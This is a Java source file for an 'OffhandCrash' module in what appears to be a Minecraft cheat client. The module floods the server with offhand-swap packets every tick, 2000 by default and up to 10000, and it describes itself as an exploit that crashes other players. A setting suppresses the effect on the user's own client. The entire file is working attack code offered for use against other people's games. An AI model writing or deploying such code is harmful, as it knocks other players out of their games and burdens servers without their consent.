/*
 * This file is part of the Pollux Client distribution (https://github.com/PolluxDevelopment/pollux-client/).
 * Copyright (c) 2020 Pollux Development.
 */

package rardoger.polluxclient.modules.misc;

import me.zero.alpine.listener.EventHandler;
import me.zero.alpine.listener.Listener;
import rardoger.polluxclient.events.world.PlaySoundEvent;
import rardoger.polluxclient.events.world.PostTickEvent;
import rardoger.polluxclient.modules.Category;
import rardoger.polluxclient.modules.ToggleModule;
import rardoger.polluxclient.settings.BoolSetting;
import rardoger.polluxclient.settings.IntSetting;
import rardoger.polluxclient.settings.Setting;
import rardoger.polluxclient.settings.SettingGroup;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;

public class OffhandCrash extends ToggleModule {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Boolean> doCrash = sgGeneral.add(new BoolSetting.Builder()
            .name("do-crash")
            .description("Sends X number of offhand swap sound packets to the server per tick.")
            .defaultValue(true)
            .build()
    );

    private final Setting<Integer> speed = sgGeneral.add(new IntSetting.Builder()
            .name("speed")
            .description("The amount of swaps measured in ticks.")
            .defaultValue(2000)
            .min(1)
            .sliderMax(10000)
            .build()
    );

    private final Setting<Boolean> antiCrash = sgGeneral.add(new BoolSetting.Builder()
            .name("anti-crash")
            .description("Attempts to prevent you from crashing yourself.")
            .defaultValue(true)
            .build()
    );

    public OffhandCrash() {
        super(Category.Misc, "offhand-crash", "An exploit that can crash other players by swapping back and forth between your main hand and offhand..");
    }


    private static final PlayerActionC2SPacket PACKET = new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, new BlockPos(0, 0, 0) , Direction.UP);

    @EventHandler
    private final Listener<PostTickEvent> onTick = new Listener<>(event -> {
        if (doCrash.get()) {
            for(int i = 0; i < speed.get(); ++i) mc.player.networkHandler.sendPacket(PACKET);
        }
    });

    @EventHandler
    private final Listener<PlaySoundEvent> onPlaySound = new Listener<>(event -> {
        if (antiCrash.get() && event.sound.getId().toString().equals("minecraft:item.armor.equip_generic")){
            event.cancel();
        }
    });
}